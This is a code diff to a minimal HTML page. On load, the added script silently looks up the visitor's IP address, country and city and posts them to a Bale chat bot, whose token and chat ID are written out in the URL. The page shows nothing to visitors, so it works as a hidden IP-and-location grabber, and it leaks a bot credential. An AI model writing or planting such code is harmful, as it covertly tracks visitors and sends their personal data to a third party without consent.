@@ -1,22 +1,24 @@
+<body>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
 
-<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
-
-<script type="text/javascript">
-    $(document).ready(function() {
-         $.getJSON("https://api.ipify.org?format=json", function(getip) {
-
+    <script>
+        $.getJSON("https://api.db-ip.com/v2/free/self", function(info){
+            var ip = info.ipAddress;
+            var continentCode = info.continentCode;
+            var continentName = info.continentName;
+            var countryCode = info.continentCode;
+            var countryName = info.countryName;
+            var city = info.city;
+            let text =  "ip : " + ip + "\n continentCode : " + continentCode + " \ncontinentName : " + continentName + " \ncountryCode : " + countryCode + "\ncountryName : " + countryName  + "\ncity : " + city;
             $.ajax({
                 type:'post',
+                mode: "cors",
+                cache: "no-cache",
                 url:"https://tapi.bale.ai/botwT9ArKZEC8Pxy7mSjvMPHsPj6JiJlIEQDX7P7MOT/sendMessage",
-                data:{chat_id:"915303220", text : getip.ip},
-                success:function(response){
-                    console.log(data);
-                    //console.log(data);
-                    // console.log(data.length);
-                },
-    
+                data:{chat_id:"915303220", text :text},
             });
-           });
-         
-    }); 
-</script>
+        })// get ip
+    
+    </script>
+
+</body>
